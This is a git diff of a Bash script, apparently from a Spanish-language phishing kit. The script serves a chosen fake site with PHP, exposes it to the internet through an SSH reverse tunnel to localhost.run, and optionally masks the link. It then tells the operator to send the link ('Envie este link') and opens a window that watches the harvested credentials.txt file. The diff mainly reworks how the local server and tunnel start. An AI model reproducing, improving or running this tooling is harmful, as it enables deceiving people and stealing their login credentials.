@@ -108,23 +108,25 @@ process(){
 	echo -e "\n[${CYAN}+${END}] ${CYAN}Iniciando servidor${END}"
 	cd sites/$1
 	sudo service apache2 stop &>/dev/null
-	php -S 127.0.0.1:80 &>/dev/null &
-	cd ../../
+	# php -S 127.0.0.1:80 &>/dev/null &
+	# cd ../../
 	if [ $2 == 'Port_Forwarding' ];then
-		xterm -geometry 93x20-50-350 -hold -title "Servidor" -e "sudo ssh -R 80:localhost:80 localhost.run > link.txt" &
+	    php -S 127.0.0.1:80 &>/dev/null &
+	    cd ../../
+		xterm -geometry 93x20-50-350 -hold -title "Servidor" -e "sudo ssh -R 80:localhost:80 nokey@localhost.run > link.txt" &
+		sleep 2
 		while true;do
-			if [[ -f 'link.txt' && -s 'link.txt' ]];then
-				link=$(cat link.txt | grep https | head -n 1 | awk '{print $NF}')
-				if [ $3 == 'Enmascarar_link' ];then
-					mask $link $1
-				else
-					clear
-					banner
-					echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $link"
-					echo $link | xclip -sel clip
-					echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
-				fi
+			link=$(cat link.txt | grep https | head -n1 | awk '{print $NF}')
+			if [ $3 == 'Enmascarar_link' ];then
+				mask $link $1
 				break
+			else
+				clear
+				banner
+				echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $link"
+				echo $link | xclip -sel clip
+				echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
+			break
 			fi
 		done
 		xterm -geometry 93x20-750-350 -hold -title "Credenciales" -e "watch -n1 cat sites/$1/credentials.txt" &
@@ -134,7 +136,9 @@ process(){
 	else
 		clear
 		banner
-		echo -e "[${CYAN}+${END}] ${CYAN}Link: ${END} http://127.0.0.1 o http://$(hostname -I | awk '{print $1}')"
+		php -S $(hostname -I | awk '{print $1}'):80 &>/dev/null &
+		cd ../../
+		echo -e "[${CYAN}+${END}] ${CYAN}Link: ${END} http://$(hostname -I | awk '{print $1}')"
 		xterm -hold -title "Credenciales" -e "watch -n1 cat sites/$1/credentials.txt" &
 		while true;do
 			sleep 1
